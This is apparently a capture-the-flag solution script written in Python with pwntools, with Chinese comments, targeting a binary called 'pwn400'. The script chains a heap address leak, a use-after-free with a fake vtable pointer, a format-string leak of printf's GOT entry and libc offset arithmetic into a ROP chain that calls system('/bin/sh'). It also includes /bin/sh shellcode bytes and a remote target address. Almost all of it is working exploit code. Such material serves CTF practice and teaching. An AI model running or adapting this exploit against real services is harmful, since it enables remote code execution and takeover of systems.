from pwn import *
from ctypes import *

####这题主要是考察了uaf，加密后数据存放没注意，可以泄露出堆地址  第一步
####uaf可以，在decrypt后，释放的指针不清空，从而comment时形成uaf，同时存在函数指针
####构造循环泄露地址存在困难，因为在加密及解密时，会对栈的某个位进行check，我这可以利用两次
####所以先泄露出两个函数的got，即read和printf，后面使用libc-database，泄露出system的地址
####最后libc-database坑了我一把，服。。。。。

####其实由于类第一个传的是类指针，所以还需要构造gadget来控制函数流，gadget在构造时自己傻了
####一般ret前也会存在add rsp，自己这个要注意。


DEBUG = 1
if DEBUG:
     p = process('./pwn400')
else:
     r = remote('172.16.4.93', 13025)


shellcode=""
shellcode += "\x31\xf6\x48\xbb\x2f\x62\x69\x6e"
shellcode += "\x2f\x2f\x73\x68\x56\x53\x54\x5f"
shellcode += "\x6a\x3b\x58\x31\xd2\x0f\x05"

print_plt=0x400be0
print_got=0x604018 
read_got=0x604040 

pp7=0x0000000000401245 #: add rsp, 0x28 ; pop rbx ; pop rbp ; ret
prdi_ret=0x0000000000402343# : pop rdi ; ret

offset___libc_start_main_ret = 0x21b45
offset_system = 0x00000000000414f0
offset_dup2 = 0x00000000000d9c60
offset_read = 0x00000000000d95b0
offset_write = 0x00000000000d9610
offset_str_bin_sh = 0x161160
offset_printf = 0x0000000000050d50



def pwn():
    #gdb.attach(p,"b *0x401FBA")
    ###part1  泄露出堆地址
    p.recvuntil('exit\n')
    p.send('1\n')
    
    p.recvuntil('No\n')
    p.send('1\n')
    p.recvuntil('p: \n')
    p.send('3\n')
    p.recvuntil('q: \n')
    p.send('5\n')

    p.recvuntil('exit\n')
    p.send('2\n')
    p.recvuntil('0x40)\n')
    p.send('64\n')
    p.recvuntil('text')
    p.send('a'*0x40)
    p.recvuntil('ciphertext: ')
    data=p.recvuntil('What')[:-5]
    data=data[512:]
    malloc_ptr=u64(data.ljust(8,'\x00'))
    print hex(malloc_ptr)
    p.recvuntil('exit\n')

    ###part2 decrypt，最后释放堆块
    p.send('3\n')
    p.recvuntil('encoded)')
    p.send('24\n')
    p.recvuntil('text\n')
    p.send('0n0000000n00000000000000\n')

    ###part2 comment，申请堆块，从而覆盖虚函数指针
    p.recvuntil('5. exit\n')
    p.send('4\n')
    p.recvuntil('RSA')
    fake_vtable_ptr=malloc_ptr-0x220
    format=malloc_ptr-0x258
    stri="%8$s".ljust(56,'c')
    data=p64(fake_vtable_ptr)+stri+8*p64(pp7)
    p.send(data+'\n')

    ####part4 复用堆块，printf函数泄露地址
    p.recvuntil('exit\n')
    p.send('2\n')
    p.recvuntil('0x40)\n')
    p.send('64\n')
    p.recvuntil('text')
    data=p64(prdi_ret)+p64(format)+p64(print_plt)+p64(0x401D9D)+p64(print_got)*3
    data=data.ljust(64,'k')
    p.send(data)

    print_addr=u64(p.recvuntil('ccc')[1:-3].ljust(8,'\x00'))
    print "printf addr",hex(print_addr)

    ####part5 libc-database 出来的地址，最后得到system函数地址
    libc_base=print_addr-offset_printf
    system_addr=libc_base+offset_system
    binsh_addr=libc_base+offset_str_bin_sh

    ###part6  复用堆块，执行system函数，得到shell
    p.recvuntil('exit\n')
    p.send('2\n')
    #print p.recv()
    p.recvuntil('0x40)\n')
    print "123"
    p.send('64\n')
    p.recvuntil('text')
    data=p64(0x0000000000400bc1)+p64(prdi_ret)+p64(binsh_addr)+p64(system_addr)
    data=data.ljust(64,'k')
    p.send(data)
    
    p.interactive()



if __name__ == '__main__':
   pwn()

